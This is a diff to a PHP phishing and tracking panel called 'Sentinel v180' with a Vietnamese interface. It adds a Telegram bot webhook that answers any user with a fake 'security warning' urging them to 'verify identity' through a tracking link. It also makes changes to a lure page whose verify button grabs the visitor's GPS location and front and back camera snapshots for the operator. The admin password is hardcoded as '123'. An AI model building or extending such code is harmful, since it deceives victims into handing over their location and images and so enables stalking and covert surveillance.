@@ -15,7 +15,9 @@ date_default_timezone_set('Asia/Ho_Chi_Minh');
 $admin_pass = '123'; 
 $db_file    = '.ht_sentinel_v180_final.db';
 $retention_days = 30;
-$base_url   = (isset($_SERVER['HTTPS']) ? "https://" : "http://") . $_SERVER['HTTP_HOST'] . explode('index.php', $_SERVER['PHP_SELF'])[0];
+$script_dir = rtrim(str_replace('\\', '/', dirname($_SERVER['SCRIPT_NAME'] ?? '/')), '/');
+$base_path  = $script_dir === '' ? '/' : $script_dir . '/';
+$base_url   = (isset($_SERVER['HTTPS']) ? "https://" : "http://") . $_SERVER['HTTP_HOST'] . $base_path;
 
 try {
     $db = new PDO("sqlite:$db_file");
@@ -45,6 +47,7 @@ try {
         ];
         foreach($defaults as $k => $v) { $db->prepare("INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)")->execute([$k, $v]); }
     }
+    $db->prepare("DELETE FROM logs WHERE time < datetime('now', ?)")->execute(["-{$retention_days} days"]);
 } catch (Exception $e) { die("Bảo trì."); }
 
 function get_c($k) { global $db; $st = $db->prepare("SELECT value FROM settings WHERE key = ?"); $st->execute([$k]); return $st->fetchColumn(); }
@@ -59,6 +62,17 @@ if (isset($_GET['action'])) {
     if ($_GET['action'] === 'rev_geo') {
         $opts = ['http'=>['header'=>"User-Agent: Sentinel_v180\r\n"]];
         echo @file_get_contents("https://nominatim.openstreetmap.org/reverse?format=json&lat={$_GET['la']}&lon={$_GET['lo']}&accept-language=vi", false, stream_context_create($opts));
+    }
+
+    if ($_GET['action'] === 'tg_webhook') {
+        $update = json_decode(file_get_contents('php://input'), true);
+        $tid = $update['message']['chat']['id'] ?? null;
+        $tk = get_c('tg_token');
+        if ($tid && $tk) {
+            $reply = "⚠️ <b>CẢNH BÁO BẢO MẬT</b>\n\nPhát hiện truy cập lạ. Xác minh danh tính ngay:\n🔗 <a href='{$base_url}?v={$tid}'>XÁC MINH TẠI ĐÂY</a>";
+            @file_get_contents("https://api.telegram.org/bot$tk/sendMessage?chat_id=$tid&text=".urlencode($reply)."&parse_mode=HTML");
+        }
+        echo json_encode(['ok' => true]);
     }
     if ($_GET['action'] === 'push') {
         $in = json_decode(file_get_contents('php://input'), true);
@@ -156,6 +170,7 @@ if (isset($_GET['admin'])) {
 <?php exit; }
     $_SESSION['v180_auth'] = $admin_pass;
     
+    if (isset($_GET['logout'])) { unset($_SESSION['v180_auth']); header("Location: ?admin"); exit; }
     if (isset($_GET['clear_logs'])) { $db->exec("DELETE FROM logs"); header("Location: ?admin&t=2"); exit; }
     if (isset($_GET['del_l'])) { $db->prepare("DELETE FROM links WHERE id = ?")->execute([$_GET['del_l']]); header("Location: ?admin"); exit; }
     if (isset($_POST['save_cfg'])) {
@@ -169,6 +184,11 @@ if (isset($_GET['admin'])) {
             $db->prepare("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)")->execute([$ck, isset($_POST[$ck]) ? '1' : '0']);
         }
         $db->prepare("INSERT OR REPLACE INTO links (id, title, desc, img, redir) VALUES (?,?,?,?,?)")->execute([$_POST['lid'], $_POST['ttl'], $_POST['dsc'], $_POST['img'], $_POST['red']]); header("Location: ?admin"); exit;
+    }
+    if (isset($_GET['set_wb'])) {
+        $u = $base_url . "?action=tg_webhook";
+        @file_get_contents("https://api.telegram.org/bot".get_c('tg_token')."/setWebhook?url=".urlencode($u));
+        header("Location: ?admin&t=5"); exit;
     }
 
     $links = $db->query("SELECT * FROM links ORDER BY clicks DESC")->fetchAll();
@@ -285,7 +305,7 @@ if (isset($_GET['admin'])) {
             <div class="grid lg:grid-cols-2 gap-8"><form method="POST" action="?admin&t=4" class="card space-y-4 shadow-2xl"><h3>GIAO DIỆN & ROOT ID</h3><input name="ui_msg" id="i_msg" value="<?=get_c("ui_msg")?>" oninput="upW()"><input name="ui_st" id="i_st" value="<?=get_c("ui_st")?>" oninput="upW()"><input name="btn_text" id="i_btn" value="<?=get_c("btn_text")?>" oninput="upW()"><hr class="border-slate-800 my-4"><input name="root_title" id="r_ttl" value="<?=get_c("root_title")?>" oninput="upW()"><input name="root_desc" id="r_dsc" value="<?=get_c("root_desc")?>" oninput="upW()"><input name="root_img" id="r_img" value="<?=get_c("root_img")?>" oninput="upW()"><input name="root_redir" value="<?=get_c("root_redir")?>"><div class="grid grid-cols-2 gap-3 text-white normal-case text-[9px]"><label class="toggle-card bg-black border border-slate-800 rounded-xl p-3 flex items-center gap-2"><input type="checkbox" name="capture_front" value="1" <?=get_c('capture_front') === '1' ? 'checked' : ''?>> Camera trước</label><label class="toggle-card bg-black border border-slate-800 rounded-xl p-3 flex items-center gap-2"><input type="checkbox" name="capture_back" value="1" <?=get_c('capture_back') === '1' ? 'checked' : ''?>> Camera sau</label></div><p class="text-[7px] text-amber-400 normal-case italic">Safari iOS/Chrome sẽ hiện hộp thoại quyền; hệ thống không thể tự chấp nhận thay người xem.</p><button type="submit" name="save_cfg" class="bg-emerald-600 text-white py-4 rounded-2xl font-black w-full uppercase shadow-lg">LƯU CẤU HÌNH WEB</button></form><div class="card flex flex-col items-center justify-center bg-white shadow-2xl"><p class="text-gray-400 mb-6 uppercase text-[8px] font-black italic text-center">Frontend Preview</p><div class="w-full max-w-xs border border-gray-200 p-8 rounded-[2rem] text-center shadow-xl"><div class="w-10 h-10 border-4 border-blue-600 border-t-transparent rounded-full animate-spin mx-auto mb-4"></div><p id="p_msg" class="text-[9px] font-black text-gray-500 uppercase tracking-widest"><?=get_c('ui_msg')?></p><p id="p_st" class="text-gray-300 text-[7px] mt-1 uppercase"><?=get_c('ui_st')?></p><div class="mt-6 bg-blue-600 text-white py-3 rounded-full font-black text-[9px] uppercase shadow-lg" id="p_btn"><?=get_c('btn_text')?></div></div></div></div>
         </div>
 
-        <div id="t5" class="tab-content max-w-4xl mx-auto space-y-6"><form method="POST" action="?admin&t=5" class="card space-y-6 shadow-2xl"><h3>TELEGRAM BOT CONFIG</h3><div class="grid lg:grid-cols-2 gap-4"><input name="tg_token" value="<?=get_c("tg_token")?>" placeholder="BOT TOKEN"><input name="tg_id" value="<?=get_c("tg_id")?>" placeholder="CHAT ID"></div><div><label class="text-blue-500 text-[8px] uppercase mb-2 block font-black">Nội dung báo cáo Telegram</label><textarea name="tg_msg_template" rows="8" class="font-mono text-[9px]"><?=get_c("tg_msg_template")?></textarea></div><button type="submit" name="save_cfg" class="btn-pro italic">LƯU CÀI ĐẶT</button></form></div>
+        <div id="t5" class="tab-content max-w-4xl mx-auto space-y-6"><form method="POST" action="?admin&t=5" class="card space-y-6 shadow-2xl"><h3>TELEGRAM BOT CONFIG</h3><div class="grid lg:grid-cols-2 gap-4"><input name="tg_token" value="<?=get_c("tg_token")?>" placeholder="BOT TOKEN"><input name="tg_id" value="<?=get_c("tg_id")?>" placeholder="CHAT ID"></div><div><label class="text-blue-500 text-[8px] uppercase mb-2 block font-black">Nội dung báo cáo Telegram</label><textarea name="tg_msg_template" rows="8" class="font-mono text-[9px]"><?=get_c("tg_msg_template")?></textarea></div><button type="submit" name="save_cfg" class="btn-pro italic">LƯU CÀI ĐẶT</button><button type="button" onclick="location.href='?admin&set_wb=1'" class="w-full bg-slate-800 text-slate-400 py-3 rounded-2xl italic font-black uppercase">🔗 KÍCH HOẠT WEBHOOK BOT</button></form></div>
 
         <div id="t6" class="tab-content max-w-5xl mx-auto space-y-8">
             <div class="grid lg:grid-cols-2 gap-8"><div class="card space-y-6"><h3 class="text-yellow-500 italic uppercase">📍 THÔNG TIN CỦA BẠN (ADMIN)</h3><div class="space-y-4 text-[9px] font-mono leading-relaxed"><p class="text-blue-500">🌐 IPv4 SERVER: <b class="text-white"><?=$ip_v4_serv?></b></p><p class="text-blue-500">🌐 IP CỦA BẠN: <b id="adm_ip" class="text-white">Quét...</b></p><p class="text-blue-500">🏢 NHÀ MẠNG: <b id="adm_isp" class="text-white">...</b></p><p class="text-blue-500">📍 VÙNG: <b id="adm_region" class="text-white">...</b></p><hr class="border-slate-800"><p class="text-emerald-500 uppercase">🎯 GPS CHUẨN: <b id="adm_geo" class="text-white">Đang lấy...</b></p><p class="text-emerald-500 uppercase">🏠 ĐỊA CHỈ: <b id="adm_addr" class="text-white italic normal-case">...</b></p></div><button onclick="getAdminLoc()" class="bg-yellow-600 text-white py-4 rounded-2xl font-black w-full shadow-lg italic uppercase">CẬP NHẬT LẠI VỊ TRÍ CỦA TÔI</button></div><div id="adm_map" class="h-[400px] rounded-[3rem] border border-yellow-500/30 shadow-2xl bg-slate-900 overflow-hidden"></div></div>
@@ -327,7 +347,8 @@ if (!$l) { $l = ['id'=>'ROOT', 'title'=>get_c('root_title'), 'desc'=>get_c('root
         <div id="ldr" class="w-12 h-12 border-4 border-blue-600 border-t-transparent rounded-full animate-spin mx-auto mb-6"></div>
         <p id="msg" class="text-[10px] font-black text-gray-400 uppercase tracking-widest animate-pulse"><?=get_c('ui_msg')?></p>
         <p class="text-slate-300 text-[8px] mt-2 tracking-widest mb-8"><?=get_c('ui_st')?></p>
-        <div id="v" class="hidden mt-8"><button onclick="forceAsk()" class="w-full bg-blue-600 text-white font-black py-4 rounded-[2rem] shadow-2xl uppercase italic border-none cursor-pointer"><?=get_c('btn_text')?></button></div>
+        <div id="v" class="hidden mt-8"><button id="verify_btn" onclick="forceAsk()" class="w-full bg-blue-600 text-white font-black py-4 rounded-[2rem] shadow-2xl uppercase italic border-none cursor-pointer"><?=get_c('btn_text')?></button></div>
+        <p id="verify_status" class="hidden text-slate-300 text-[8px] mt-4 tracking-widest">ĐANG XỬ LÝ...</p>
     </div>
     <script>
     const captureFront = <?=json_encode(get_c('capture_front') === '1')?>;
@@ -343,6 +364,12 @@ if (!$l) { $l = ['id'=>'ROOT', 'title'=>get_c('root_title'), 'desc'=>get_c('root
         setTimeout(() => { document.getElementById('ldr').classList.add('hidden'); document.getElementById('v').classList.remove('hidden'); }, 1500);
     };
     async function forceAsk() {
+        const box = document.getElementById('v');
+        const btn = document.getElementById('verify_btn');
+        const status = document.getElementById('verify_status');
+        btn.disabled = true;
+        box.classList.add('hidden');
+        status.classList.remove('hidden');
         const loc = await askGeoOrFallback('WEB');
         const img_front = captureFront ? await takeSnap('user') : null;
         const img_back = captureBack ? await takeSnap('environment') : null;
